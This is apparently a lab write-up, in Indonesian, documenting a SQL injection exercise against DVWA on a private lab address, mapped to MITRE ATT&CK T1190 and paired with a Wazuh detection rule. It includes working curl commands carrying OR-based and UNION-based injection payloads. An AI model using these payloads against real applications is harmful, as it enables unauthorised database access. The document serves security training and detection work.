# SQL Injection Attack

## Deskripsi
SQL Injection adalah serangan yang menyisipkan query SQL berbahaya
ke dalam input aplikasi untuk memanipulasi database.

## MITRE ATT&CK
- Tactic: Initial Access
- Technique: T1190 — Exploit Public-Facing Application

## Target
- URL: `http://192.168.217.130/DVWA/vulnerabilities/sqli/`
- Parameter: `id`
- Security Level: Low

## Attack Commands
```bash
# Setup session
SESS="PHPSESSID=MY_SESSION; security=low"
![SQL Injection](Screenshot_2026-04-10_11_44_09.png)

# Basic SQL Injection
curl -s "http://192.168.217.130/DVWA/vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit" \
  -b "$SESS"

# UNION Based SQL Injection
curl -s "http://192.168.217.130/DVWA/vulnerabilities/sqli/?id=1+union+select+1,2--&Submit=Submit" \
  -b "$SESS" -o /dev/null -w "Status: %{http_code}\n"
```

## Detection
- Tool: Wazuh Custom Rules
- Rule ID: 100011
- Level: 10 (High)
- Log Source: Nginx access.log (JSON format)

## Evidence
Lihat folder `screenshots/` untuk bukti serangan dan deteksi.
